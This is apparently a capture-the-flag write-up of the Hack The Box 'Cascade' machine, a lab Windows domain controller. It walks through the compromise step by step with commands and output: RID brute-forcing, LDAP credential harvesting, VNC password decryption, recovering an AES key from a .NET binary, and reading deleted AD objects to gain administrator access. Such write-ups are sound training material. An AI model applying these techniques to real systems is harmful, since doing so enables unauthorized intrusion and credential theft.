# Cascade

# User Flag

## NMAP Enumeration

NMAP All Port Scan

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.182

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49170/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.182 -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-15 12:16:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-15T12:17:05
|_  start_date: 2024-06-15T12:03:41
```

## SMB Enumeration (Part 1)

Could not list any shares but compiled a list of users vie `enum4linux` and `crackmapexec`:

```bash
crackmapexec smb 10.10.10.182 -u '' -p '' --rid-brute

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
SMB         10.10.10.182    445    CASC-DC1         [+] Brute forcing RIDs
SMB         10.10.10.182    445    CASC-DC1         498: CASCADE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         500: CASCADE\administrator (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         501: CASCADE\CascGuest (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         502: CASCADE\krbtgt (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         512: CASCADE\Domain Admins (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         513: CASCADE\Domain Users (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         514: CASCADE\Domain Guests (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         515: CASCADE\Domain Computers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         516: CASCADE\Domain Controllers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         517: CASCADE\Cert Publishers (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         518: CASCADE\Schema Admins (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         519: CASCADE\Enterprise Admins (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         520: CASCADE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         521: CASCADE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         553: CASCADE\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         571: CASCADE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         572: CASCADE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1001: CASCADE\CASC-DC1$ (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1102: CASCADE\DnsAdmins (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1103: CASCADE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.10.182    445    CASC-DC1         1106: CASCADE\arksvc (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1107: CASCADE\s.smith (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1109: CASCADE\r.thompson (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1111: CASCADE\util (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1113: CASCADE\IT (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1114: CASCADE\Production (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1115: CASCADE\HR (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1116: CASCADE\j.wakefield (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1119: CASCADE\AD Recycle Bin (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1120: CASCADE\Backup (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1121: CASCADE\s.hickson (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1122: CASCADE\j.goodhand (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1123: CASCADE\Temps (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1124: CASCADE\a.turnbull (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1125: CASCADE\WinRMRemoteWMIUsers__ (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1126: CASCADE\Remote Management Users (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1127: CASCADE\e.crowe (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1128: CASCADE\b.hanson (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1129: CASCADE\d.burman (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1130: CASCADE\BackupSvc (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1132: CASCADE\Factory (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1133: CASCADE\Finance (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1134: CASCADE\j.allen (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1135: CASCADE\i.croft (SidTypeUser)
SMB         10.10.10.182    445    CASC-DC1         1137: CASCADE\Audit Share (SidTypeAlias)
SMB         10.10.10.182    445    CASC-DC1         1138: CASCADE\Data Share (SidTypeAlias)
```

## Kerberos Enumeration

Tested user list for valid names:

```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.182 -d cascade.local -o kerbrute-user-enum userlist

2024/06/15 13:31:00 >  [+] VALID USERNAME:       CASC-DC1$@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       arksvc@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       administrator@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       j.wakefield@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       util@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       s.smith@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       s.hickson@cascade.local
2024/06/15 13:31:00 >  [+] VALID USERNAME:       r.thompson@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       a.turnbull@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       j.goodhand@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       d.burman@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       BackupSvc@cascade.local
2024/06/15 13:31:05 >  [+] VALID USERNAME:       j.allen@cascade.local
```

Attempted ASREPRoasting with Impacket but this failed.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py cascade.local/ -dc-ip 10.10.10.182 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
```

## LDAP Enumeration

Get the base naming contexts via LDAP:

```bash
ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Enumertaed users and found set of base64 encoded credentials for the user `r.thompson@cascade.local`:

```bash
ldapsearch -x -H ldap://10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people

.......
cascadeLegacyPwd: clk0bjVldmE=
.......
```

Set of credentials: `r.thompson:rY4n5eva`

The user cannot connect over winrm:

```bash
crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
    
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
```

## SMB Enumeration (Part 2)

Used credentials and `smbmap` to enumerate shares.

```bash
smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva

[+] IP: 10.10.10.182:445        Name: 10.10.10.182              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

Used smbclient to signin to the `Data` share:

```bash
smbclient //10.10.10.182/data --user r.thompson --password rY4n5eva

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 27 03:27:34 2020
  ..                                  D        0  Mon Jan 27 03:27:34 2020
  Contractors                         D        0  Mon Jan 13 01:45:11 2020
  Finance                             D        0  Mon Jan 13 01:45:06 2020
  IT                                  D        0  Tue Jan 28 18:04:51 2020
  Production                          D        0  Mon Jan 13 01:45:18 2020
  Temps                               D        0  Mon Jan 13 01:45:15 2020
```

Only have access to the `IT` share and extracted multiple files:

```bash
-rw-r--r-- 1 kali kali 1303 Jun 15 14:33  ArkAdRecycleBin.log
-rw-r--r-- 1 kali kali 2522 Jun 15 14:32  Meeting_Notes_June_2018.html
-rw-r--r-- 1 kali kali 2680 Jun 15 14:35 'VNC Install.reg'
-rw-r--r-- 1 kali kali 5967 Jun 15 14:34  dcdiag.log
```

The Email Message in `Meeting_Notes_June_2018.html`:

![Email Message](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Cascade/Images/Email%20Message.png)

The file `'VNC Install.reg'` found under a folder titled `s.smith` contains a password:

```bash
cat 'VNC Install.reg'

"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

The file `ArkAdRecycleBin.log` contains keyword `TempAdmin`:

```bash
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
```


## VNC Password Decrypt 

Searching online provides a [method](https://github.com/frizb/PasswordDecrypts) to decrypt the VNC password:

```bash
echo -n "6bcf2a4b6e5aca0f"| xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

Running `crackmapexec` shows the user `s.smith` can authenticate via WinRM:

```bash
crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2

SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

Used `evil-winrm` to authenticate and get user flag:

```bash
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/15/2024   1:04 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
```

# Root Flag

## SMB Enumeration (Part 3)

Used the credentials to enumerate shares again and found a new share titled `Audit$`:

```bash
crackmapexec smb 10.10.10.182 -u s.smith -p sT333ve2 --shares

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
```

Used `smbclient` to connect to `Audit$` share:

```bash
smbclient //10.10.10.182/audit$ --user s.smith --password sT333ve2

smb: \> dir
  .                                   D        0  Wed Jan 29 18:01:26 2020
  ..                                  D        0  Wed Jan 29 18:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 21:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 18:00:20 2020
  DB                                  D        0  Tue Jan 28 21:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 23:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 06:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 06:38:38 2019
  x64                                 D        0  Sun Jan 26 22:25:27 2020
  x86                                 D        0  Sun Jan 26 22:25:27 2020
```

Pulled files to kali machine and viewed `Audit.db` in `sqlitebrowser`:

![database](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Cascade/Images/Database.png)

Attempting to base64 decode the password `BQO5l5Kj9MdErXx6Q6AGOw==` for the user `ArkSvc` does not return a string so it looks to be encrypted. 

## Reverse Engineer Executable

Pulled the executable `CascAudit.exe` which is a .Net executable and saved it on the FlareVM machine:

```bash
CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Loding the executable `CascAudit.exe` in DnSpy shows that the password is being decrypted using the “Crypto” library.

```csharp
try {
  sqliteConnection.Open();
  using(SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection)) {
    using(SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) {
      sqliteDataReader.Read();
      str = Conversions.ToString(sqliteDataReader["Uname"]);
      str2 = Conversions.ToString(sqliteDataReader["Domain"]);
      string text = Conversions.ToString(sqliteDataReader["Pwd"]);
      try {
        password = Crypto.DecryptString(text, "c4scadek3y654321");
      } catch (Exception ex) {
        Console.WriteLine("Error decrypting password: " + ex.Message);
        return;
      }
    }
  }
  sqliteConnection.Close();
} catch (Exception ex2) {
  Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
  return;
}
```

I can also see that `CascCrypto` is a DLL being used in the main executable `CascAudit.exe`.

```csharp
using System;
using System.Collections;
using System.Data.SQLite;
using System.DirectoryServices;
using CascAudiot.My;
using CascCrypto;
using Microsoft.VisualBasic.CompilerServices;
```

Loaded the `CascCrypto.dll` into DnSpy and found the decrypt function:

```csharp
public static string DecryptString(string EncryptedString, string Key) {
  byte[] array = Convert.FromBase64String(EncryptedString);
  Aes aes = Aes.Create();
  aes.KeySize = 128;
  aes.BlockSize = 128;
  aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
  aes.Mode = CipherMode.CBC;
  aes.Key = Encoding.UTF8.GetBytes(Key);
  string @string;
  using(MemoryStream memoryStream = new MemoryStream(array)) {
    using(CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)) {
      byte[] array2 = new byte[checked(array.Length - 1 + 1)];
      cryptoStream.Read(array2, 0, array2.Length);
      @string = Encoding.UTF8.GetString(array2);
    }
  }
  return @string;
}
```

The code is using the IV (Initialization Vector) `1tdyjCbY1Ix49842` and the code is basically using the AES 128 bit decryption with the cipher mode CBC and a key size of 128 bits. Based on the information at hand, I can decrypt the password using the following [website](https://www.devglan.com/online-tools/aes-encryption-decryption).

I can also create a python [script](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Cascade/Scripts/decrypt_password.py) to decrypt the password.

New set of credentials: `ArkSvc:w3lc0meFr31nd`

## Privilege Escalation - AD Recycle Bin (Group)

Confirmed that user can signin via WinRM:

```bash
crackmapexec winrm 10.10.10.182 -u arksvc -p "w3lc0meFr31nd"

SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
```

Signed in with `evil-winrm`:

```bash
evil-winrm -i 10.10.10.182 -u arksvc -p "w3lc0meFr31nd"
```

Checking details about the user shows that they belong to a group titled `AD Recycle Bin`. Membership in this group allows for the reading of deleted Active Directory objects, which can [reveal sensitive information](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges):

```bash
*Evil-WinRM* PS C:\Users\arksvc> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

.......
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
.......
```

I found a deleted object titled `TempAdmin` with a base64 encoded password `YmFDVDNyMWFOMDBkbGVz`. Can decode this password and using it with the administrator account appears to work:

```bash
evil-winrm -i 10.10.10.182 -u administrator -p "baCT3r1aN00dles"

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/15/2024   1:04 PM             34 root.txt
```



















